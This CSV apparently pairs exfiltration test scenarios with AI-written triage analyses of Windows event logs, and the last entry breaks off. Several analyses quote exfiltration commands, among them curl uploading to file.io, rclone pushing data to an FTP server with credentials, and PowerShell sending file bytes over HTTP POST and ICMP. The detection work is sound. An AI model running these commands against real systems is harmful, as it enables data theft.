Directory Name,AI Response
DNSExfiltration (doh),"Upon analyzing the provided Windows event logs, several indicators suggest potentially malicious activity:

1. **PowerShell Usage:**
   - Multiple instances of PowerShell execution (Event Record IDs 17946, 17976) are recorded. This is not inherently malicious but can be suspicious if unexpected. The PowerShell command used suggests importing and executing a script from a temporary location, which could be an indication of malicious intent.
   - The command line associated with the PowerShell instance includes a script path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\script.ps1\`), which is executed by the `Invoke-scripttrator` command. This command is unusual and not a standard PowerShell command, often a red flag for potential malicious activity or custom script execution.

2. **Process Execution:**
   - Frequent process creation and termination involving `conhost.exe`, `wevtutil.exe`, and `hostname.exe` under the user `SERVER002\admin_test` within a short timeframe can be a red flag. Although `conhost.exe` is often legitimate, its frequent invocation without clear context can indicate a process chain possibly associated with obfuscating or hosting shell operations.
   - `wevtutil.exe` is commonly used to clear or manage event logs. Frequent use could indicate attempts to cover tracks.

3. **Command Line and Scripting:**
   - The command line observed in PowerShell Event Logs reveals interactions with a domain (`target.example.com`). This action implies possible exfiltration or command and control communications, especially suspect when conducted from a script in a Temp directory.
   - The usage of the `-doh` parameter indicates DNS over HTTPS communication, which can be used to bypass network monitoring solutions.

4. **Lack of Parent Process:**
   - The PowerShell processes appear to stem from `wsmprovhost.exe`, indicating remote PowerShell activity likely via Windows Remote Management (WinRM), which is a common technique for remote access in both legitimate administration and advanced persistent threat (APT) activities.

The combination of unusual scripting activity, frequent process creations, and the context of the tools and parameters used suggests a behavior more aligned with unauthorized administrative access or potential compromise rather than benign activity.

**Assessment: SUSPICIOUS**

**Guidance:**
- Investigate user `SERVER002\admin_test` for unauthorized access or compromised credentials.
- Review the mentioned scripts (`script.ps1`) for their contents and understand the complete intent of their execution.
- Monitor network logs for data exfiltration, focusing on connections to `target.example.com`.
- Check for any associated alerts in the EDR that correspond with this time frame for further correlation.
- Conduct a thorough endpoint scan using updated antivirus or EDR tools.
- Validate with the CEO or their assistance about the legitimacy of the observed PowerShell scripts and their purpose.

Further investigation is recommended to confirm or rule out malicious intent and ensure appropriate measures are taken to secure the environment."
Exfiltration Over Alternative Protocol - HTTP,"Based on the provided logs, I have analyzed the events to identify any potential indicators of malicious activity. Here's the detailed analysis:

1. **Security Log Analysis:**
   - EventID 4624 (An account was successfully logged on) and EventID 4672 (Special privileges assigned to new logon) for the `admin_test` user account, along with the privileges listed, suggest a login with elevated privileges. Generally, this isn't indicative of malicious activity if it corresponds to scheduled administrative tasks or expected behavior. However, if unexpected, it could be concerning.
   - There is evidence of time alteration in EventID 4616, which changes the system time. Time alteration can potentially indicate attempts to evade detection methods based on timestamp analysis. This requires further investigation to determine its legitimacy.

2. **PowerShell Logs:**
   - EventID 600 entries show the execution of a PowerShell script involving reading `notepad.exe` and sending its contents to a local server URL using HTTP POST. This activity is suspicious, as it involves unauthorized access and potential exfiltration of data, albeit to a local address.
   - Detailed command-line input captured: `""powershell.exe & {$content = Get-Content C:\Windows\System32\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content}""`. Although the destination is localhost, any data exfiltration attempt, especially of system executables, is an indicator of potentially malicious activity.

3. **Sysmon Log:**
   - Frequent execution of `whoami.exe`, `conhost.exe`, and other system utilities by the `admin_test` user. While these are somewhat normal, an administrator might use them for auditing, high frequency, or unexpected usage should be verified for legitimacy.
   - The presence of processes like MicrosoftEdgeUpdate activities suggests legitimate software updates, but it's critical to ensure they align with expected update schedules to rule out potential exploitation.

4. **System Log Analysis:**
   - Time changes are corroborated here with Kernel-General events reflecting the time was set backwards. This supports the findings from the Security log and requires further scrutiny.

**Assessment:**
- The presence of elevated privilege logons and administrative actions in Security logs is typical for administrative tasks, yet can still signal possible misuse.
- The PowerShell logs reveal potentially malicious script activities involving unauthorized data access and possible exfiltration attempts.
- The Sysmon logs do not demonstrate overt malicious behavior aside from the abnormal usage patterns which may indicate probing or unauthorized accounts accessing sensitive systems.

**Conclusion:**
Given the suspicious PowerShell activities likely related to data exfiltration attempts (albeit to a local endpoint) and irregular time modifications that may indicate deception tactics, the situation is best categorized as **SUSPICIOUS**. Further investigation is warranted, especially regarding the legitimacy of the PowerShell commands, the intent behind system time changes, and whether the elevated privileged logons were authorized.

**Guidance on how to proceed:**
- Conduct a deep dive into the origin and timing of the PowerShell script execution. Verify if its use is legitimate and aligns with organizational policies.
- Cross-reference with network logs to assess any unauthorized outbound communications.
- Confirm whether the detected logon activities and privilege assignments align with expected behaviors for the `admin_test` account.
- Review System time alterations in correlation with known legitimate actions to validate or disprove any malicious intent.
- If necessary, isolate the affected system for further forensic analysis to prevent potential spread or data loss."
Exfiltration Over Alternative Protocol - ICMP,"Upon reviewing the provided logs, several aspects of the activity on ""Server002"" are noteworthy and require further analysis:

### Suspicious Behaviors Identified:

1. **Time Manipulation:**
   - The logs indicate an inconsistency in the system time, where events show the system time being set backwards. This is captured under the Kernel-General EventID 1 and Security EventID 4616 indicating a change in the system time. Such manipulations are sometimes leveraged by attackers to evade detection mechanisms that rely on time-based monitoring.
   - Events show the system time changing from ""2024-10-22 15:39:21.4364499"" to ""2024-10-22 15:39:16.2101787"", suggesting manual intervention.

2. **Unusual PowerShell Activity:**
   - There is a PowerShell script captured which reads the content of ""C:\Windows\System32\notepad.exe"" in byte mode and pings it to ""127.0.0.1"". While not outright malicious, this behavior could be a technique to obfuscate data exfiltration or testing in a production environment.
   - The PowerShell command: `powershell.exe & {$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(""127.0.0.1"", 1500, $Data) }}` rightfully appears suspicious especially if not part of normal operations.

3. **Unexpected Process Executions:**
   - Frequent execution of processes like `wevtutil.exe`, `conhost.exe`, and `hostname.exe`, all under the user ""SERVER002\\admin_test"", could be standard but should be cross-verified against expected administrative tasks to rule out any misuse or unauthorized execution.
   - The process hierarchy also shows `PowerShell.exe` being spawned by `wsmprovhost.exe`, not typically expected in regular administrative operations.

4. **Elevation and Persistence Indicators:**
   - The logs contain entries where processes like `svchost.exe` are seen performing tasks with SYSTEM integrity levels. This is common, yet when combined with time changes and PowerShell misuse, it does raise red flags pointing to potential privilege escalations or unauthorized service manipulations.

### Assessment:

From the analysis of the provided logs, there are clear signs of **SUSPICIOUS** activity. Although there's no definitive proof of a breach or malware, several behaviors such as system time alteration, unusual PowerShell script execution, and inconsistent process executions under an administrative account indicate that further investigation is warranted.

### Recommendations:

1. **Immediate Actions:**
   - Conduct a thorough investigation of the system time changes to rule out potential indicators of anti-forensic behavior.
   - Review recent administrative actions and validate the necessity and authenticity of executed commands and scripts, particularly those performed by the ""admin_test"" account.
   - Examine network traffic for any unusual patterns or potential data exfiltration attempts potentially related to the PowerShell script.

2. **Contingent Steps:**
   - Audit all privileged user accounts and service configurations to ensure no unauthorized changes or escalations have been made.
   - Enhance endpoint detection mechanisms to flag anomalies in time settings and PowerShell scripts early on.

3. **Post-Investigation Follow-up:**
   - Based on findings, reassess and update security protocols and incident response plans to incorporate lessons learned and prevent similar incidents in the future.

This situation is marked as **SUSPICIOUS** and requires further investigation to validate the extent and impact of the detected anomalies."
C2 Data Exfiltration,"After reviewing the provided logs, the following points stand out:

### Application Log
- **EventID 16384**: This is a log entry from the 'Software Protection Platform Service' indicating activity related to a scheduled task. This entry does not appear to indicate malicious activity.

### System Log
- The system logs show time changes executed by the `svchost.exe` process. Constantly shifting system time or frequent changes could be suspicious in some contexts, but in this case, they appear to be adjustments related to time synchronization (NTP), which are typical system operations.

### Windows PowerShell Log
- Several PowerShell events (EventID 600) indicate the execution of a script that reads a file's contents and sends it via `Invoke-WebRequest` to `example.com`. This behavior is suspicious because:
  - The script conditions the creation of a text file with a hundred lines and makes a web request to an external domain with its contents.
  - Although `example.com` is typically a placeholder, the intentional redirection script setup and use of `Invoke-WebRequest` for an HTTP POST action are red flags often associated with data exfiltration.

### Security Log
- **EventID 4624**: Two successful logon events of type 3 (network logon) suggest normal remote access.
- **EventID 4672**: Special privileges assigned to a user (`admin_test`) indicate administrative actions were taken, which can be expected in routine and maintenance operations. However, the context of use alongside suspicious behavior might need closer inspection.

### Sysmon Log
- Multiple process creation events:
  - **wevtutil.exe**: Frequently used for querying event logs, which can be part of administrative work or potentially malicious actions when used inaudaciously.
  - **conhost.exe** and **whoami.exe** operations seem typical when run by administrative users checking their environment.
  - **powershell.exe** script execution captured aligns with the suspicious PowerShell logs.
  - **Microsoft Edge Update** processes under the NT AUTHORITY\SYSTEM user do not seem out of place, indicating normal update or system maintenance activity.

### Analysis Conclusion
The key point of concern is the PowerShell activity which appears to be conducting a potentially harmful action by posting local files to an external website. The access and permissions of the user (admin_test) along with script execution patterns need deeper investigation to verify the legitimacy.

### Resolution
- **SUSPICIOUS**: The PowerShell logs demonstrate potential data exfiltration attempts, which warrant further investigation to confirm if they were authorized actions or attempts of data breach. It's crucial to investigate the context of the PowerShell script, the nature of the text file, and why it was posted externally.

### Guidance
1. **Immediate Actions**:
   - Verify the intentions behind the PowerShell script and the external URL.
   - Identify if 'example.com' is a legitimate destination for the organization's processes or a placeholder for malicious intent.

2. **Further Investigation**:
   - Review user `admin_test` activity to ensure authorization for actions performed.
   - Examine any additional network logs or firewall records for suspicious outbound activities corresponding to this event timeframe.

3. **Precautionary Measures**:
   - Alert team administrators about PowerShell exploits and ensure all scripts are properly vetted and logged.
   - Conduct user access audits to confirm adherence to least privilege principles, especially for privileged accounts like `admin_test`."
Exfiltrate data HTTPS using curl windows,"Based on the provided logs and a careful analysis of the activities, here are the observations and findings:

1. **Repeated Occurrences of `wevtutil.exe` and `conhost.exe`**: We observe several instances where these processes are executed by an account `SERVER002\\admin_test`. The execution of `wevtutil.exe` could be benign or could indicate an attempt to query or manipulate event logs, which can be suspicious in a security context if frequent or unusual.

2. **PowerShell Execution**: The execution of `powershell.exe` is noted. PowerShell is a legitimate system administration tool but is often used in attacks due to its powerful scripting capabilities. The context and the commands executed via PowerShell would determine if this is potentially malicious.

3. **Command Execution for `cmd.exe` with `curl.exe`**: An instance of suspicious behavior is marked by the use of `cmd.exe` to run `curl.exe` with arguments to upload a file: 
   - Command: `cmd.exe /c C:\\Windows\\System32\\Curl.exe -k -F ""file=@C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file/data.002/src/artifact"" https://file.io/`
   - `curl.exe` is being used to upload a file to an external service (`https://file.io/`). This could indicate data exfiltration.

4. **Execution of `hostname.exe` and `whoami.exe`**: These commands are typically benign as they are used to gather system and user information, respectively. However, in combination with other suspicious activities, they might be used by an attacker to understand the environment they are operating in.

5. **Sysmon EventID 1 and 5**: The logs capture several Sysmon Event ID 1 (Process Creation) and Event ID 5 (Process Termination) events. These highlight the sequences of process execution and termination but, importantly, expose the chain of command initiation involving PowerShell, cmd, curl, and other utilities.

6. **Use of High Integrity Level**: The operations appear to be executed at a high integrity level, hinting at administrative privileges being leveraged.

Given the analysis, the behavior surrounding the use of `cmd.exe` to run `curl.exe` for potential data exfiltration to an external source is notably suspicious. While individual processes like `whoami.exe` or `hostname.exe` may seem benign, their context and potential data exfiltration activities need further attention.

**Resolution:** **SUSPICIOUS**

- **Guidance**: 
  - Investigate the `curl` upload activity to confirm whether it was legitimate or a case of data exfiltration.
  - Review the user account activity (`SERVER002\\admin_test`) to check for unauthorized actions.
  - Conduct a thorough analysis of the command-line arguments used in PowerShell and other processes to ensure no scripts were run that might have compromised the system.
  - Monitor network traffic and employ application whitelisting to restrict unauthorized script execution and network communications."
IcedID Botnet HTTP PUT,"**Detailed Analysis**

### Contextual Overview

The logs provided show a series of activities on a machine identified as ""Server002"". The events are primarily from the Security, Sysmon, and Windows PowerShell logs. Key observations include multiple login activities, process creations, and command executions.

### Identified Suspicious Events

1. **Event ID 4672 (Special Privileges Assigned to New Logon):**
   - User: `admin_test` was assigned a wide range of high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`.
   - These privileges are typically required for advanced system-level manipulations and can be indicative of potential privilege escalation.

2. **Event ID 4624 (An Account was Successfully Logged On):**
   - A logon event using NTLM from an external workstation named `DESKTOP-3HL5B2P`.
   - Multiple events show logon type `3`, which indicates a network logon. The use of NTLM and network logon type might be benign in secure environments but could be a potential vector for lateral movement if unexpected.

3. **PowerShell Event:**
   - Execution of a PowerShell script which attempts to create a file and then use `Invoke-WebRequest` to upload it to `https://google.com`.
   - This could potentially be exfiltration of data, which is suspicious especially given the pattern of sending data to a public domain.

4. **Sysmon Event - Process Creation:**
   - Creation of processes such as `wevtutil.exe` and `conhost.exe` repeatedly by the `admin_test` user.
   - Frequent invocations of these processes can be normal for administrative tasks; however, they can also be used in evasion tactics when executed remotely or in contexts like the PowerShell script observed.

5. **Credential Validation Failures:**
   - Event ID 5379: Multiple attempts seem to fail with return codes indicating permission issues or incorrect credential usage.
   - These could suggest attempted unauthorized access or credential harvesting attempts.

### Assessment

Given the combination of assigned high privileges, network-based logon using NTLM, failed credential access attempts, the execution of PowerShell scripts intended to put data onto an external URL, and repetitive administrative utility process executions, there is significant evidence that this activity could indicate malicious intents or a compromised system.

### Resolution

**Resolution: SUSPICIOUS**

The activities listed indicate an elevated risk level. While not all events conclusively prove malicious actions, the unusual combination of high privilege assignment, external network logon with NTLM, data exfiltration attempts via PowerShell, and repeated execution of potential admin tools collectively suggest this instance requires further detailed investigation to determine the intent and scope of these actions.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Confirm the legitimacy of the user `admin_test` and cross-check with login approval processes.
   - Isolate `Server002` to prevent potential lateral movements.

2. **Investigation Steps:**
   - Conduct a thorough review of `admin_test`'s recent authentication logs and privilege assignments.
   - Validate the external IP and workstation details to ensure they match expected usage patterns.
   - Analyze additional PowerShell logs and scripts for confirmation of unauthorized data transfer activities.

3. **Preventative Measures:**
   - Review and enforce stricter access control policies, especially for high privileges.
   - Ensure robust monitoring of network-based login attempts and data transfer events, setting up alerting mechanisms for such anomalies.

Further investigation is warranted to discern any unauthorized access or compromise that may threaten the organization's environment."
Exfiltration via Encrypted FTP,"After conducting a thorough analysis of the provided Windows event logs, several observations can be made that need to be considered for determining the nature of the activity.

### Observations:

1. **Time Change Events:**
   - **Security Event ID 4616 and System Event ID 1:** These entries reflect changes in the system time. This can sometimes be an indication of an attempt to deceive monitoring systems by altering timestamps, although changes due to system synchronization aren’t uncommon.

2. **Process Execution:**
   - **Sysmon Events involving `whoami.exe` and `conhost.exe`:** Routine administrative commands with high integrity levels executed by `admin_test` user reflect legitimate system information queries.
   - **Execution of `powershell.exe`:** There is a PowerShell command that seems to engage in FTP operations, `Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile` which involves FTP activity from a script. This is managed by `admin_test`, who executes commands with high privileges.
   - **Sysmon logs show numerous executions of `wevtutil.exe`:** This is commonly used to manage event logs, and multiple entries could hint at potential tampering or just normal administrative tasks depending on context.

3. **Network Activity:**
   - **Logon Event ID 4624 with LogonType 3 (Network):** Indicates a network logon, possibly a connection from a remote machine (`DESKTOP-3HL5B2P`) using NTLM authentication, which is a common protocol but can be riskier if not configured correctly.

4. **Privileged Account Activity:**
   - **Security Event ID 4672:** Privileged accounts (`SYSTEM` and `admin_test`) acquiring extensive privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are typical but should be reviewed to understand necessity especially concerning `admin_test`.

5. **Software Update:**
   - **Sysmon and related entries for `Microsoft Edge Update`:** Routine update process for Microsoft Edge seems legitimate with a systematic installation process.
  
6. **Errors and Failed Operations:**
   - **Security Event ID 5379 with non-zero ReturnCodes:** Reflects failed attempts to read credential storage. Inability to read credentials can indicate unauthorized attempts but require more context to ascertain malicious intent.

### Assessment:

- **Suspicious PowerShell Activity:** The usage of PowerShell to create and transfer files over FTP is suspicious, particularly in a sensitive environment, raising concerns about data exfiltration or unauthorized file operations.
- **Time Change Anomalies:** Repeated time-sync related logs could be benign, but unusual activity in correlation with other suspicious behavior might indicate intent to cover tracks.
- **Administration Activities:** Frequent execution of `wevtutil.exe` coupled with privileged access rights elevation (e.g., `SeDebugPrivilege`) extends concern over potential misuse if unjustified.
  
### Recommendation:

Due to the following:
- The specific use of PowerShell for FTP command executions by a high-privilege user.
- The presence of failed credential read attempts, indicating potential unauthorized behavior.
- The correlation of high privilege actions and administrative maneuvers in conjunction with background FTP actions.

Final Resolution: **SUSPICIOUS**

### Guidance on how to proceed:
1. **Isolate** the system if necessary to prevent further potential data exfiltration.
2. **Review** PowerShell scripts executed and any files transferred via FTP to validate the necessity and intent.
3. **Audit** privileges assigned to `admin_test`; ensure only necessary permissions are maintained.
4. **Correlate** with network logs to verify if unusual remote connections occurred.
5. **Conduct a deeper forensic investigation** into these logs to determine the nature and impact of these activities and consider incorporating additional monitoring around PowerShell executions and network logins."
Exfiltration Over Alternative Protocol - FTP - Rclone,"Upon examining the provided Windows event logs, there are several points of interest indicating potentially malicious activity:

### Detailed Analysis:

1. **PowerShell Usage**:
    - A process for `powershell.exe` was initiated by the user `SERVER002\\admin_test` at `2024-10-22 15:54:06.1820997`. The command executed uses PowerShell to automate potentially suspicious actions.
    - A specific command was noted where `rclone.exe` is utilized to configure an FTP server and copy files to `ftp.dlptest.com` using FTP protocol:
      ```
      CommandLine: ""powershell.exe"" & {$rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include ""rclone.exe"" | Select-Object -ExpandProperty FullName, $script_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include ""script.zip"" | Select-Object -ExpandProperty FullName, &$rclone_bin config create ftpserver ""ftp"" ""host"" ftp.dlptest.com ""port"" 21 ""user"" dlpuser ""pass"" rNrKYTX9g7z3RgJRmxWuGHbeu, &$rclone_bin copy --max-age 2y $script_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate}
      ```
    - The use of `rclone.exe` to copy files to a public FTP server and the presence of login credentials (even if possibly dummy) in a script executed via PowerShell is highly suspicious and typically indicative of data exfiltration activities. 

2. **Execution of `rclone.exe`**:
    - Multiple instances of `rclone.exe` were executed, configuring FTP and copying files. This strongly suggests that files are being transferred out from this host to a remote location, which is a common behavior in incidents involving data breaches or unauthorized access.

3. **High Integrity Level Processes**:
    - Processes were run at a high integrity level, giving them elevated privileges, which could allow more impactful operations potentially compromising system integrity.

4. **Security Logs and Other Anomalies**:
    - Event 4672 indicates that System privileges were granted which could be abused for privilege escalation or persistence methods.
    - There are multiple Event ID 5379, indicating attempts to access credentials which could imply attempts at privilege reconnaissance or unauthorized access.
  
5. **Other Event Logs**:
    - While many processes like `svchost.exe`, `CompatTelRunner.exe`, and `wermgr.exe` seem standard, the critical activities surrounding `rclone.exe` and the PowerShell script overshadow these typical operations.

### Assessment:

Based on the PowerShell commands observed, the execution of rclone to copy files to an FTP server, and the use of potentially sensitive operations (high integrity level processes and privilege handling), it indicates:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

- **Immediate Action**: Disconnect the server (SERVER002) from the network to prevent further data exfiltration.
- **Forensic Analysis**: Perform a comprehensive forensic analysis of the system to understand the scope and method of the compromise. Look for any additional scripts, payloads, or IOCs (Indicators of Compromise).
- **Credentials Audit**: Advise resetting credentials, especially if any credentials were stored on this machine, as they might be compromised.
- **Review Network Logs**: Inspect network logs for unusual outbound connections, especially to any non-standard FTP servers.
- **Full System Scan**: Conduct a deep malware scan using an updated antivirus or EDR tool, ensuring that any malicious software or scripts are identified and removed."
Exfiltrate data with rclone to cloud Storage - Mega (Windows),"**Detailed Analysis:**

1. **Security Log:**
   - **Event ID 4624:** A logon event indicating successful logon using SYSTEM account (S-1-5-18) on Server002 using Logon Type 5, which corresponds to a Service logon. This event alone is not suspicious as SYSTEM account logons are normal for services running on Windows.
   - **Event ID 4672:** Indicates that special privileges were assigned to the SYSTEM account. The privileges include SeDebugPrivilege, SeTakeOwnershipPrivilege, among others. While SYSTEM account typically holds these privileges, they need to be viewed concerning the other events logged around the same time.

2. **PowerShell Log:**
   - The logs indicate that a PowerShell script executed commands to create directories and configuration files related to `rclone`, a known file synchronization tool. Using PowerShell to script these operations is relatively common, but the context and command contents raise a red flag.
   - The script creates and writes to `rclone.conf`, configuring a connection type `mega` with user `filetesting@outlook.com`. This configuration typically indicates a setup for data transfer to a remote storage service.
   - The command `rclone.exe copy` is used, which is of particular concern as it suggests potential data exfiltration.

3. **Sysmon Log:**
   - Logging of `powershell.exe`, `rclone.exe`, and typical Windows commands (`wevtutil.exe`, `conhost.exe`) under `SERVER002\admin_test` account indicates scripting activity. The repeated invocation of `rclone.exe` with similar parameters as seen with PowerShell implies execution of the script captured in the PowerShell log.
   - A high integrity level indicates potentially elevated permissions, paired with the subsequent ops raises concerns about privilege misuse.
   - The context of rclone activities from a temp directory under `admin_test`, execution as a child of PowerShell processes, aligns with potential malicious use—specifically data exfiltration, due to the nature of rclone.

**Assessment of the Situation:**
- The usage of `rclone` to configure and connect to an external storage account, combined with the copying of files to a remote location, implies a potential data exfiltration attempt.
- System and security logs don't show clear explicit signs of compromise but given the engaged tools' capabilities and purpose; these align with potentially unauthorized activity.
- The absence of a legitimate business case for such data operations using external cloud storage (e.g., MEGA) from an account on Server002 and initiated by the admin_test user strengthens this suspicion.

**Conclusion-Resolution:**
- **MALICIOUS**: The logs indicate with high certainty a data exfiltration attempt using a PowerShell script to execute rclone operations transferring files to a MEGA storage account. This behavior is not typical for a regular system operation, especially from the account and directory mentioned, indicating potential compromise.

**Guidance on How to Proceed:**
- Immediate remediation actions should include:
  - Isolating `Server002` to prevent further possible data breach.
  - Conducting a thorough review of accessed/modified data during the timeframe of these logs.
  - Analyzing the origin of the executed scripts and reviewing user `admin_test` actions.
  - Implementing prevention measures such as blocking unauthorized cloud storage access and restricting PowerShell/script execution unless vetted.
  - Notify the CEO and relevant IT security team members about the potential compromise and associated risk.
  - Engage in forensic analysis to trace back how the malicious actor gained access and executed these scripts, fixing any vulnerabilities detected."
Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),"The provided logs pertain to activities on a Windows host, specifically involving a Sysmon event log, System log, Application log, Security log, and Windows PowerShell log. An analysis of these logs reveals several indicators that suggest both benign system operations as well as potentially malicious activity. Let's delve into each of these for clarity.

### Key Observations

1. **Sysmon Log:**
   - There are multiple executions of standard Windows utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe`, which appear to be executed from a high-integrity context by the user 'admin_test'. Normally, these utilities are benign, but their frequency and context may suggest they are being used in a sequence typical of enumeration activities.
   - The execution of `powershell.exe` with the command to upload what appears to be sensitive data (`secrets, api keys, passwords...`) to a Pastebin-like service (`https://pastebin.com`) is highly alarming. This activity strongly suggests data exfiltration, which is a common tactic of malicious operations.
   
2. **System Log:**
   - The system time is showing changes, which is unusual and can be indicative of attempts to manipulate time-based logs or application behavior. However, this alone is not conclusive without further context.

3. **Application Log:**
   - Standard logs for services starting and stopping, notably `edgeupdate`, which typically belongs to Microsoft Edge. These operations appear normal and consistent with software update management actions.

4. **Security Log:**
   - The user `admin_test` shows multiple high-privilege operations. The privilege escalation or use of elevated privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) is noteworthy and common in malicious activity, especially when coupled with suspicious actions like those seen in the Sysmon logs.

5. **Windows PowerShell Log:**
   - Again shows the PowerShell script used for potentially malicious purposes, as explained previously, further confirming the suspicious activity.

### Assessment: MALICIOUS

- **Indicators of Malice:**
  - The PowerShell script attempting to exfiltrate data to an external source is a strong indicator of malicious intent.
  - The unusually repetitive use of system utilities with high privileges suggests enumeration and potentially evasive actions.
  - Privilege escalation to execute high-level operations on the system that align with typical attack vectors used in penetration testing or exploitation.

### Recommendations:

1. **Immediate Containment:** Isolate the affected machine (Server002) from the network to prevent any further unauthorized data transmission.
   
2. **Investigate User Activities:** Conduct a thorough investigation into the account 'admin_test' for any unauthorized access or misuse. Reset credentials and enforce multi-factor authentication if not already implemented.

3. **Review Security Policies:** Assess security configurations to ensure that all systems and tools have the least privilege needed to operate.

4. **Forensic Analysis:** Undertake a detailed forensic analysis of the machine to identify any potential data loss or further indicators of compromise.

5. **Implement Monitoring:** Enhance monitoring for similar activities across the network, focusing on unusual behavior, particularly related to PowerShell and data exfiltration.

Based on the evidence from this log analysis, the conclusion is that the activity is confirmed to be malicious. Immediate action is recommended to protect organizational assets and mitigate further risk."
Exfiltration Over Alternative Protocol - SMTP,"After reviewing the provided Windows event logs, here’s a detailed analysis:

### Analysis of Suspicious or Anomalous Behavior:

1. **PowerShell Activity**:
   - The logs contain multiple entries related to the execution of a PowerShell script with the command:
     ```
     Send-MailMessage -From test@corp.com -To test@corp.com -Subject ""data.003 file Test"" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1

   - This command is suspicious because it attempts to send an email with `notepad.exe` as an attachment. Using a system executable as an attachment is unusual and could indicate an attempt to exfiltrate data or misuse a typical file.

### Indicators of Potential Malicious Activity:

- **Email Sending via PowerShell**:
  - The use of `Send-MailMessage` in PowerShell is a common method used for data exfiltration or to communicate with a command-and-control server.
  - The attachment of `notepad.exe`, a benign executable, can be leveraged for binary masquerading. Attackers might use this to evade detection systems by disguising a malicious payload as a legitimate application.

- **High Integrity Level**:
  - The PowerShell command was executed with a high integrity level, suggesting that it was run with elevated privileges. This could be indicative of privilege escalation tactics.

### Cross-Analysis with Sysmon Logs:

- **Process Execution**:
  - There are entries for the execution of legitimate Windows binaries such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe`. While these are standard system processes, their execution in a clustered timeframe alongside suspicious PowerShell activity could imply a reconnaissance or enumeration phase by the attacker.

- **Timeline and Parent Process Relationships**:
  - The logging of process creation and command execution within a tight timeline can indicate an automated sequence of commands, often seen in scripted attacks.
  - The parent process for several of these activities, such as `wsmprovhost.exe`, indicates possible remote execution due to Windows Remote Management (WinRM).

### Risks and Threats Identified:

- **Potential Data Exfiltration**: The PowerShell script attempting to send an executable suggests a risk of data leakage or attack payload dispatch.
- **Privilege Escalation and Lateral Movement**: The execution of processes with high integrity levels and the use of administrative accounts can lead to further compromise within the network.

### Guidance on How to Proceed:

1. **Immediate Containment**:
   - Isolate the affected system (SERVER002) from the network to prevent further data exfiltration or lateral movement.

2. **Thorough Investigation**:
   - Conduct a full forensic analysis of the system to understand the extent of the compromise.
   - Review additional logs (network, firewall, etc.) for signs of outbound connections to untrusted hosts.

3. **User Education and Policy Enforcement**:
   - Reinforce user training on recognizing phishing attempts and unauthorized script usage.
   - Review and tighten email and scripting policies to prevent misuse of PowerShell and other automation tools.

4. **Security Enhancement**:
   - Implement tighter access controls and monitoring for privileged accounts.
   - Deploy endpoint protection measures that can detect and block malicious script execution.

### Final Resolution:
- **MALICIOUS**: The behavior observed, particularly the execution of the PowerShell script to send a system executable as an attachment via email, clearly indicates malicious activity. Immediate action is required to address the potential security breach."
Text Based Data Exfiltration using DNS subdomains,"### Analysis of Logs:

#### Suspicious Events:
1. **PowerShell Activity:**
   - There is an unusual use of PowerShell scripting observed in the logs:
     - The script executed a sequence to encode ""SecretDataToscripttrate"" to Base64, split it, and send it via DNS queries. This is a common tactic for exfiltration of data covertly across DNS queries, categorizing it under potential data exfiltration attempts.

2. **Repetitive Execution of System Utilities:**
   - **wevtutil.exe**, **conhost.exe**, **whoami.exe** and **HOSTNAME.EXE** are frequently executed in quick succession. This can indicate attempts to gather information about the system, potentially in preparation for a malicious activity.

3. **Process Execution Context:**
   - All these utilities and scripts run under the user ""SERVER002\\admin_test"" with High Integrity Level indicating potentially compromised administrative credentials.

4. **Time Manipulation:**
   - Security logs suggest a possible system time manipulation event.
   - The Event ID 4616 with Local Service account adjusting time slightly backward. Although not immediately suspicious in all scenarios, frequent occurrence might indicate attempts to hide malicious activity timestamps.

5. **PowerShell as Parent Process:**
   - The `PowerShell` process features as a parent in distinct Sysmon Event log entries, showing Windows PowerShell was used without being a regular system maintenance activity, aligning with atypical administrative access fostering potential malicious use scenarios.

#### Indicators of Potential Compromise:
- **Data Exfiltration through DNS Tunneling:**
  - The PowerShell script strongly indicates potential data exfiltration using DNS requests. The script's intent seems to be splitting data into chunks and sending it as DNS queries, which is a known method to bypass detection mechanisms.

- **Administrative Access Utilization:**
  - The processes ran under high integrity execution which is consistent with administrative privileges, heightening their efficacy in harming system integrity or security exploitation.

#### Conclusion:
The presence of potentially covert PowerShell execution aimed at non-standard data transfers coupled with high-frequency legitimate admin tool executions and time alteration hints strongly suggests an ongoing or occurred compromise.

### Final Assessment:
**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation:**
   - Isolate the affected machine from the network to prevent further data exfiltration or command and control communication.

2. **Credentials Reissue:**
   - Consider resetting or revoking current administrative credentials or any related/account credentials that might have been compromised.

3. **In-depth Forensic Investigation:**
   - Conduct a full investigation on the machine to identify any additional signs of infection and particularly track the unauthorized access or additional payloads.

4. **Implement Additional Monitoring & Alerting:**
   - Increase logging and monitoring around DNS queries to catch similar exfiltration attempts promptly.
   - Monitor for any unusual system utilities execution fitting similar patterns detected here.

5. **Update Security Measures:**
   - Evaluate and enhance existing security systems to ensure better detection of such PowerShell command activities and exfiltration patterns. Consider employing Endpoint Detection and Response (EDR) solutions with exceptional scripting and DNS analysis capabilities."
MAZE FTP Upload,"Upon reviewing the provided Windows event logs, several elements and activities warrant attention and analysis. Here's a detailed breakdown of the observations and associated concerns:

### Summary of Findings:
1. **Process Execution:**
   - There is frequent use of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe` and `PowerShell`. 
   - The `wevtutil.exe` process is a legitimate Windows utility often used for managing event logs, repeating execution in quick succession.
